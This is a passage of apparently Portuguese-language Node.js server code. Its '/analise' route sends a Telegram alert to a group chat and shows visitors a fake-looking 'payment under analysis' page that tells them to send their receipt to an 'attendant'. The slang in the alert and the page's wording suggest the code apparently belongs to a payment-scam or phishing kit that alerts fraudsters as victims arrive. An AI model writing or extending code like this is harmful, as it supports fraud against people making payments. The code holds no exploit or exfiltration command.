        console.error("❌ Erro ao enviar notificação:", error);
        res.status(500).json({ error: "Erro ao notificar no Telegram." });
    }
});


app.get('/analise', async (req, res) => {
    try {
        await bot.telegram.sendMessage(GROUP_CHAT_ID, "🂡♠️  O comprovante sumiu, pra cima upup!");

        res.send(`
            <!DOCTYPE html>
            <html lang="pt-br">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>Pagamento em Análise</title>
                <style>
                    body {
                        font-family: 'Poppins', sans-serif;
                        margin: 0;
                        padding: 0;
                        background-color: #f8f9fa;
                        text-align: center;
                    }
                    .container {
                        max-width: 500px;
                        margin: 10vh auto;
                        padding: 20px;
                        background: white;
                        box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.1);
                        border-radius: 10px;
                    }
                    h1 {
                        color: #61005E;
                        font-size: 24px;
                    }
                    p {
                        color: #444;
                        font-size: 16px;
                    }
                    .btn {
                        display: inline-block;
                        margin-top: 15px;
                        padding: 10px 20px;
                        background-color: #61005E;
                        color: white;
                        text-decoration: none;
                        font-size: 16px;
                        border-radius: 5px;
                        transition: 0.3s;
                    }
                    .btn:hover {
                        background-color: #95008e;
                    }
                </style>
            </head>
            <body>
                <div class="container">
                    <h1>Pagamento em Análise</h1>
                    <p>Detectamos que seu pagamento está sendo analisado. Para garantir sua transação, por favor, envie o comprovante para seu atendente.</p>
                    
                </div>
            </body>
            </html>
        `);
    } catch (error) {
        console.error("Erro ao enviar mensagem para o Telegram:", error);
        res.status(500).send("Erro interno no servidor.");
    }
});





const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
    console.log(`🟢 Servidor rodando em: ${RENDER_URL}`);
    
    // Só inicia o bot via polling em desenvolvimento
    if (process.env.NODE_ENV !== 'production') {
        bot.launch();
        console.log('🤖 Bot iniciado via polling (modo desenvolvimento)');
    }
});
